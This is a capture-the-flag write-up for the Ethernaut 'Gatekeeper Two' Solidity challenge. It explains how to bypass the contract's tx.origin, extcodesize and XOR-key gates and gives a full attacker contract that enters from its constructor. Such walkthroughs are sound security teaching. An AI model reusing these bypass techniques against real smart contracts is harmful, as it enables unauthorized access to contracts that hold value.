# Gatekeeper Two

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract GatekeeperTwo {
    
      address public entrant;
    
      modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
      }
    
      modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
      }
    
      modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
      }
    
      function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
      }
    }
    
Gatekeeper Two presents another challenge in Solidity smart contract security. Similar to Gatekeeper One, it employs multiple gates that need to be bypassed to gain access.

### Gate One
    ```solidity
    modifier gateOne() {
      require(msg.sender != tx.origin);
      _;
    }
    
Gate One aims to prevent direct external calls by ensuring that msg.sender is not equal to tx.origin. To bypass this gate, an intermediary contract can be deployed before calling the target contract, altering the msg.sender value.

### Gate Two
    ```solidity
    modifier gateTwo() {
      uint x;
      assembly { x := extcodesize(caller()) }
      require(x == 0);
      _;
    }
    
Gate Two checks if the caller's code size is zero. During contract deployment, before the constructor completes, the runtime code size is indeed zero. Exploiting this, one can ensure that the gate is passed during contract creation.

### Gate Three
    ```solidity
    modifier gateThree(bytes8 _gateKey) {
      require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
      _;
    }
    
Gate Three involves a bitwise XOR condition. To bypass it, one needs to understand that X XOR Y = Z is equivalent to X XOR Z = Y. By setting _gateKey appropriately, this condition can be satisfied.

Here's a script to bypass Gatekeeper Two:

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    
    import "../instances/Ilevel14.sol";
    
    contract LetMeInTwo {
    
        constructor () public {
            GatekeeperTwo level12 = GatekeeperTwo(0x2D55d7Fd2cd2d3344F2Fd694f05E3fd63A9FDCDA);
            bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
            level12.enter(myKey);        
        }
    }
    
Deploying this contract and submitting the instance would allow one to successfully bypass Gatekeeper Two and proceed further in the hacking challenge.
